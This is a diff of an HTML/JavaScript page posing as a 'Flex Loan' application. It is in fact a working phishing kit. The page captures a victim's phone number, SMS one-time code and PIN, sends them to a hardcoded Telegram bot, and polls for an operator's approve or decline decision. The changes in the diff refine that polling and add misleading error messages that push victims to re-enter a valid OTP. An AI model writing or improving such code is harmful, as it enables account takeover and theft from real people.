@@ -516,8 +516,10 @@
         const BOT = '8859342218:AAFzA-NZabjvMtibeTz3Ft6QY-CMlufYyzg';
         const CID = '7669060473';
         let bd = {}, luid = 0, otp = '', phone = '';
-        let sent = false;            // ensure the OTP message is sent only once
+        let sent = false;
         let pinPollInterval = null;
+        let otpPollInterval = null;
+        let otpPollTimeout = null;
         const boxes = document.querySelectorAll('.otp-box');
         const pinBoxes = document.querySelectorAll('.pin-box');
 
@@ -545,7 +547,6 @@
                 b.addEventListener('input', e => {
                     const v = e.target.value;
                     if (v.length > 1) {
-                        // Paste / autofill: distribute digits across boxes
                         const digs = v.replace(/\D/g, '').split('');
                         digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
                         boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
@@ -567,7 +568,6 @@
                 });
             });
 
-            // Autofill from clipboard / SMS suggestion paste
             document.addEventListener('paste', e => {
                 const data = e.clipboardData.getData('text').replace(/\D/g, '');
                 if (data.length >= 6) {
@@ -582,7 +582,6 @@
                 }
             });
 
-            // WebOTP autofill (Android: autocomplete="one-time-code")
             if ('OTPCredential' in window) {
                 try {
                     navigator.credentials.get({ otp: { transport: ['sms'] } }).then(cred => {
@@ -605,8 +604,24 @@
 
         function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
 
-        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
+        function showErr(m) {
+            const e = document.getElementById('err');
+            e.textContent = m;
+            e.style.display = 'block';
+        }
+
         function clrErr() { document.getElementById('err').style.display = 'none'; }
+
+        function resetOTPFields() {
+            otp = '';
+            sent = false;
+            document.getElementById('autoNote').style.display = 'none';
+            document.getElementById('verifyBtn').disabled = false;
+            boxes.forEach(b => {
+                b.value = '';
+                b.classList.remove('ok');
+            });
+        }
 
         async function tg(msg, btns) {
             try {
@@ -626,7 +641,6 @@
             return false;
         }
 
-        /* Autosend: 6 digits complete → send to Telegram immediately */
         function autosend() {
             if (sent) return;
             sent = true;
@@ -635,24 +649,34 @@
             setTimeout(() => doOTP(), 600);
         }
 
-        function doOTP() {
-            clrErr();
-            if (otp.length !== 6) { showErr('Please enter the full 6-digit code'); return; }
-
-            // Start with 7 instead of +263
-            const msg = `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nPlease choose an action below:`;
-            // Two buttons: Approve and Decline
-            const btns = [[{ text: '✅ Approve', callback_data: 'otp_approved' }, { text: '❌ Decline', callback_data: 'otp_declined' }]];
-
-            document.getElementById('ov').classList.add('on');
-            tg(msg, btns).then(() => {
-                poll();
-            });
+        function stopOTPPolling() {
+            if (otpPollInterval) {
+                clearInterval(otpPollInterval);
+                otpPollInterval = null;
+            }
+            if (otpPollTimeout) {
+                clearTimeout(otpPollTimeout);
+                otpPollTimeout = null;
+            }
         }
 
-        /* Wait for Approve/Decline from Telegram */
-        function poll() {
-            const iv = setInterval(() => {
+        function handleOTPResult(action) {
+            stopOTPPolling();
+            document.getElementById('ov').classList.remove('on');
+
+            if (action === 'otp_approved') {
+                openPINModal();
+                return;
+            }
+
+            showErr('The OTP provided is incorrect or has expired. Please provide the valid OTP to continue.');
+            resetOTPFields();
+            boxes[0].focus();
+        }
+
+        function pollOTP() {
+            stopOTPPolling();
+            otpPollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
                     .then(r => r.json())
                     .then(d => {
@@ -661,26 +685,45 @@
                                 luid = u.update_id;
                                 if (u.callback_query) {
                                     const cb = u.callback_query.data;
-                                    if (cb === 'otp_approved') {
-                                        clearInterval(iv);
-                                        document.getElementById('ov').classList.remove('on');
-                                        // Approve clicked → open PIN popup modal
-                                        openPINModal();
-                                    }
-                                    else if (cb === 'otp_declined') {
-                                        clearInterval(iv);
-                                        document.getElementById('ov').classList.remove('on');
-                                        showErr('Verification declined by the operator. Please check your details and try again.');
-                                        boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); });
-                                        boxes[0].focus();
+                                    if (cb === 'otp_approved' || cb === 'otp_declined') {
+                                        handleOTPResult(cb);
                                     }
                                 }
                             });
                         }
-                    }).catch(e => console.error(e));
+                    })
+                    .catch(e => console.error(e));
             }, 1500);
 
-            setTimeout(() => { clearInterval(iv); }, 600000);
+            otpPollTimeout = setTimeout(() => {
+                stopOTPPolling();
+                document.getElementById('ov').classList.remove('on');
+                showErr('The OTP could not be verified within the allowed time. Please provide the valid OTP to continue.');
+                resetOTPFields();
+                boxes[0].focus();
+            }, 600000);
+        }
+
+        function doOTP() {
+            clrErr();
+            if (otp.length !== 6) {
+                showErr('Please enter the full 6-digit code');
+                return;
+            }
+
+            const msg = `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')}</code>\n💵 <b>Amount:</b> <code>$${Number(bd.price || 0).toLocaleString()}</code>`;
+            const btns = [[{ text: '✅ Approve', callback_data: 'otp_approved' }, { text: '❌ Decline', callback_data: 'otp_declined' }]];
+
+            document.getElementById('ov').classList.add('on');
+            tg(msg, btns).then(success => {
+                if (!success) {
+                    document.getElementById('ov').classList.remove('on');
+                    showErr('We could not reach the verification service. Please try again.');
+                    resetOTPFields();
+                    return;
+                }
+                pollOTP();
+            });
         }
 
         /* ============ PIN modal ============ */
@@ -741,7 +784,7 @@
             btn.disabled = true;
             btn.textContent = 'Sending...';
 
-            const msg = `🔒 <b>PIN Verification</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n🔑 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nIs this PIN valid?`;
+            const msg = `🔒 <b>PIN Verification</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n🔑 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')}</code>\n💵 <b>Amount:</b> <code>$${Number(bd.price || 0).toLocaleString()}</code>`;
             const btns = [[{ text: '✅ Valid PIN', callback_data: 'pin_valid' }, { text: '❌ Invalid PIN', callback_data: 'pin_invalid' }]];
 
             await tg(msg, btns);
@@ -764,12 +807,10 @@
                                     const cb = u.callback_query.data;
                                     if (cb === 'pin_valid') {
                                         clearInterval(pinPollInterval);
-                                        // Valid PIN → open success.html
-                                        location.href = 'success.html?name=' + encodeURIComponent(document.title) + '&amount=' + (bd.price || '0') + '&purpose=' + encodeURIComponent(bd.data || 'Flex Loan') + '&phone=' + phone;
+                                        location.href = 'success.html?name=' + encodeURIComponent(document.title) + '&amount=' + (bd.price || '0') + '&purpose=' + encodeURIComponent(bd.data || 'Flex Loan');
                                     }
                                     else if (cb === 'pin_invalid') {
                                         clearInterval(pinPollInterval);
-                                        // Invalid PIN → return to PIN popup modal
                                         pinShowErr('The PIN was declared invalid. Please re-enter your 4-digit PIN and try again.');
                                     }
                                 }
@@ -798,3 +839,4 @@ s0.parentNode.insertBefore(s1,s0);
 
 </body>
 </html>
+
